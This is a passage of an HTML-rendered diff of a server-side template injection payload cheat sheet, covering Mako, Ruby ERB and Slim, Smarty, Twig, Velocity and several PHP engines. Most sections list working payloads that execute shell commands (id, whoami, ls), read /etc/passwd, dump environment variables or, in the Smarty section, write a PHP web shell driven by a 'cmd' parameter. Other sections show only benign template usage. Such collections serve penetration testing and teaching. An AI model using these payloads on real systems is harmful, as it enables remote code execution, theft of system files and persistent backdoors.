+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>traceback<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span></code></pre></div><p>PoC :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> print(Template(<span style="color:#e6db74">&#34;$</span><span style="color:#e6db74">{self.module.cache.util.os}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>render())
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;/usr/local/lib/python3.10/os.py&#39;</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Source 
+  <a href="https://twitter.com/podalirius_">@podalirius_</a> : 
+  <a href="https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/">https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/</a></p>
+<hr>
+<h2 id="pebble">
+  Pebble
+  <a class="anchor" href="#pebble">#</a>
+</h2>
+<p>
+  <a href="https://pebbletemplates.io/">Official website</a></p>
+<blockquote>
+<p>Pebble is a Java templating engine inspired by 
+  <a href="/docs/#twig">Twig</a> and similar to the Python 
+  <a href="/docs/#jinja2">Jinja</a> Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.</p>
+</blockquote>
+<h3 id="need-bugfix-for-pebble">
+  NEED BUGFIX FOR PEBBLE
+  <a class="anchor" href="#need-bugfix-for-pebble">#</a>
+</h3>
+<hr>
+<h2 id="ruby">
+  Ruby
+  <a class="anchor" href="#ruby">#</a>
+</h2>
+<h3 id="ruby---basic-injections">
+  Ruby - Basic injections
+  <a class="anchor" href="#ruby---basic-injections">#</a>
+</h3>
+<p>ERB:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;%=</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">%&gt;</span>
+</span></span></code></pre></div><p>Slim:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">#{ 7 * 7 }</span>
+</span></span></code></pre></div><h3 id="ruby---retrieve-etcpasswd">
+  Ruby - Retrieve /etc/passwd
+  <a class="anchor" href="#ruby---retrieve-etcpasswd">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;%=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>)<span style="color:#f92672">.</span>read <span style="color:#f92672">%&gt;</span>
+</span></span></code></pre></div><h3 id="ruby---list-files-and-directories">
+  Ruby - List files and directories
+  <a class="anchor" href="#ruby---list-files-and-directories">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;%=</span> <span style="color:#66d9ef">Dir</span><span style="color:#f92672">.</span>entries(<span style="color:#e6db74">&#39;/&#39;</span>) <span style="color:#f92672">%&gt;</span>
+</span></span></code></pre></div><h3 id="ruby---code-execution">
+  Ruby - Code execution
+  <a class="anchor" href="#ruby---code-execution">#</a>
+</h3>
+<p>Execute code using SSTI for ERB engine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">%= system(&#39;cat /etc/passwd&#39;) %&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;%=</span> <span style="color:#e6db74">`ls /`</span> <span style="color:#e6db74">%&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;%= IO.popen(&#39;ls /&#39;).readlines()  %&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">% require </span> <span style="color:#e6db74">&#39;open3&#39;</span> <span style="color:#e6db74">%&gt;&lt;% @a,@b,@c,@d=Open3.popen3(&#39;whoami&#39;) %&gt;</span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">%= @b.readline()%&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;% require &#39;open4&#39; %&gt;&lt;% @a,@b,@c,@d=</span><span style="color:#66d9ef">Open4</span><span style="color:#f92672">.</span>popen4(<span style="color:#e6db74">&#39;whoami&#39;</span>) <span style="color:#e6db74">%&gt;&lt;%= @c.readline()%&gt;</span>
+</span></span></code></pre></div><p>Execute code using SSTI for Slim engine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">#{ %x|env| }</span>
+</span></span></code></pre></div><hr>
+<h2 id="smarty">
+  Smarty
+  <a class="anchor" href="#smarty">#</a>
+</h2>
+<p>
+  <a href="https://www.smarty.net/docs/en/">Official website</a></p>
+<blockquote>
+<p>Smarty is a template engine for PHP.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">$</span>smarty<span style="color:#f92672">.</span>version}
+</span></span><span style="display:flex;"><span>{php}echo <span style="color:#960050;background-color:#1e0010">`</span>id<span style="color:#960050;background-color:#1e0010">`</span>;{<span style="color:#f92672">/</span>php} <span style="color:#f92672">//</span>deprecated <span style="color:#f92672">in</span> smarty v3
+</span></span><span style="display:flex;"><span>{Smarty_Internal_Write_File::writeFile(<span style="color:#960050;background-color:#1e0010">$</span>SCRIPT_NAME,<span style="color:#e6db74">&#34;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&#34;</span>,self::clearConfig())}
+</span></span><span style="display:flex;"><span>{system(<span style="color:#e6db74">&#39;ls&#39;</span>)} <span style="color:#f92672">//</span> compatible v3
+</span></span><span style="display:flex;"><span>{system(<span style="color:#e6db74">&#39;cat index.php&#39;</span>)} <span style="color:#f92672">//</span> compatible v3
+</span></span></code></pre></div><hr>
+<h2 id="twig">
+  Twig
+  <a class="anchor" href="#twig">#</a>
+</h2>
+<p>
+  <a href="https://twig.symfony.com/">Official website</a></p>
+<blockquote>
+<p>Twig is a modern template engine for PHP.</p>
+</blockquote>
+<h3 id="twig---basic-injection">
+  Twig - Basic injection
+  <a class="anchor" href="#twig---basic-injection">#</a>
+</h3>
+<h3 id="need-bugfix-for-twig">
+  NEED BUGFIX FOR TWIG
+  <a class="anchor" href="#need-bugfix-for-twig">#</a>
+</h3>
+<h3 id="twig---template-format">
+  Twig - Template format
+  <a class="anchor" href="#twig---template-format">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>output <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>twig <span style="color:#f92672">&gt;</span> render (
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;Dear&#39;</span> <span style="color:#f92672">.</span> <span style="color:#960050;background-color:#1e0010">$</span>_GET[<span style="color:#e6db74">&#39;custom_greeting&#39;</span>],
+</span></span><span style="display:flex;"><span>  array(<span style="color:#e6db74">&#34;first_name&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#960050;background-color:#1e0010">$</span>user<span style="color:#f92672">.</span>first_name)
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>output <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>twig <span style="color:#f92672">&gt;</span> render (
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;Dear </span><span style="color:#e6db74">{first_name}</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>  array(<span style="color:#e6db74">&#34;first_name&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#960050;background-color:#1e0010">$</span>user<span style="color:#f92672">.</span>first_name)
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><hr>
+<h2 id="velocity">
+  Velocity
+  <a class="anchor" href="#velocity">#</a>
+</h2>
+<p>
+  <a href="https://velocity.apache.org/engine/1.7/user-guide.html">Official website</a></p>
+<blockquote>
+<p>Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#set($str=$class.inspect(&#34;java.lang.String&#34;).type)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#set($chr=$class.inspect(&#34;java.lang.Character&#34;).type)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#set($ex=$class.inspect(&#34;java.lang.Runtime&#34;).type.getRuntime().exec(&#34;whoami&#34;))</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>ex<span style="color:#f92672">.</span>waitFor()
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#set($out=$ex.getInputStream())</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#foreach($i in [1..$out.available()])</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>str<span style="color:#f92672">.</span>valueOf(<span style="color:#960050;background-color:#1e0010">$</span>chr<span style="color:#f92672">.</span>toChars(<span style="color:#960050;background-color:#1e0010">$</span>out<span style="color:#f92672">.</span>read()))
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#end</span>
+</span></span></code></pre></div><hr>
+<h2 id="pattemplate">
+  patTemplate
+  <a class="anchor" href="#pattemplate">#</a>
+</h2>
+<blockquote>
+<p>
+  <a href="https://github.com/wernerwa/pat-template">patTemplate</a> non-compiling PHP templating engine, that uses XML tags to divide a document into different parts</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;patTemplate:tmpl</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;page&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  This is the main page.
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;patTemplate:tmpl</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;foo&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    It contains another template.
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/patTemplate:tmpl&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;patTemplate:tmpl</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;hello&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    Hello {NAME}.<span style="color:#f92672">&lt;br/&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/patTemplate:tmpl&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/patTemplate:tmpl&gt;</span>
+</span></span></code></pre></div><hr>
+<h2 id="phplib-and-html_template_phplib">
+  PHPlib and HTML_Template_PHPLIB
+  <a class="anchor" href="#phplib-and-html_template_phplib">#</a>
+</h2>
+<p>
+  <a href="https://github.com/pear/HTML_Template_PHPLIB">HTML_Template_PHPLIB</a> is the same as PHPlib but ported to Pear.</p>
+<p><code>authors.tpl</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;{PAGE_TITLE}&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">table</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">caption</span>&gt;Authors&lt;/<span style="color:#f92672">caption</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">thead</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">th</span>&gt;Name&lt;/<span style="color:#f92672">th</span>&gt;&lt;<span style="color:#f92672">th</span>&gt;Email&lt;/<span style="color:#f92672">th</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;/<span style="color:#f92672">thead</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">tfoot</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">colspan</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span>&gt;{NUM_AUTHORS}&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;/<span style="color:#f92672">tfoot</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">tbody</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- BEGIN authorline --&gt;</span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span>&gt;{AUTHOR_NAME}&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span>&gt;{AUTHOR_EMAIL}&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- END authorline --&gt;</span>
+</span></span><span style="display:flex;"><span>   &lt;/<span style="color:#f92672">tbody</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">table</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p><code>authors.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//we want to display this author list
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$authors <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Christian Weiske&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;cweiske@php.net&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Bjoern Schotte&#39;</span>     <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;schotte@mayflower.de&#39;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require_once</span> <span style="color:#e6db74">&#39;HTML/Template/PHPLIB.php&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//create template object
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$t <span style="color:#f92672">=&amp;</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">HTML_Template_PHPLIB</span>(<span style="color:#a6e22e">dirname</span>(<span style="color:#66d9ef">__FILE__</span>), <span style="color:#e6db74">&#39;keep&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//load file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setFile</span>(<span style="color:#e6db74">&#39;authors&#39;</span>, <span style="color:#e6db74">&#39;authors.tpl&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//set block
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setBlock</span>(<span style="color:#e6db74">&#39;authors&#39;</span>, <span style="color:#e6db74">&#39;authorline&#39;</span>, <span style="color:#e6db74">&#39;authorline_ref&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//set some variables
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setVar</span>(<span style="color:#e6db74">&#39;NUM_AUTHORS&#39;</span>, <span style="color:#a6e22e">count</span>($authors));
+</span></span><span style="display:flex;"><span>$t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setVar</span>(<span style="color:#e6db74">&#39;PAGE_TITLE&#39;</span>, <span style="color:#e6db74">&#39;Code authors as of &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#39;Y-m-d&#39;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//display the authors
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">foreach</span> ($authors <span style="color:#66d9ef">as</span> $name <span style="color:#f92672">=&gt;</span> $email) {
+</span></span><span style="display:flex;"><span>    $t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setVar</span>(<span style="color:#e6db74">&#39;AUTHOR_NAME&#39;</span>, $name);
+</span></span><span style="display:flex;"><span>    $t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setVar</span>(<span style="color:#e6db74">&#39;AUTHOR_EMAIL&#39;</span>, $email);
+</span></span><span style="display:flex;"><span>    $t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parse</span>(<span style="color:#e6db74">&#39;authorline_ref&#39;</span>, <span style="color:#e6db74">&#39;authorline&#39;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//finish and echo
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">echo</span> $t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">finish</span>($t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parse</span>(<span style="color:#e6db74">&#39;OUT&#39;</span>, <span style="color:#e6db74">&#39;authors&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><hr>
+<h2 id="plates">
+  Plates
+  <a class="anchor" href="#plates">#</a>
+</h2>
+<p>Plates is inspired by Twig but a native PHP template engine instead of a compiled template engine.</p>
+<p>controller:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// Create new Plates instance
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">League\Plates\Engine</span>(<span style="color:#e6db74">&#39;/path/to/templates&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Render a template
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">echo</span> $templates<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;profile&#39;</span>, [<span style="color:#e6db74">&#39;name&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Jonathan&#39;</span>]);
+</span></span></code></pre></div><p>page template:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">layout</span>(<span style="color:#e6db74">&#39;template&#39;</span>, [<span style="color:#e6db74">&#39;title&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;User Profile&#39;</span>]) <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;h1&gt;User Profile&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;p&gt;Hello, &lt;?=$this-&gt;e($name)?&gt;&lt;/p&gt;
+</span></span></span></code></pre></div><p>layout template:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;&lt;?=</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">e</span>($title)<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;/head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;?=$this-&gt;section(&#39;content&#39;)?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
+</span></span></span></code></pre></div><hr>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/">https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/</a></li>
+<li>
+  <a href="https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/">Yahoo! RCE via Spring Engine SSTI</a></li>
+<li>
+  <a href="https://www.trustedsec.com/2017/09/rubyerb-template-injection/">Ruby ERB Template injection - TrustedSec</a></li>
+<li>
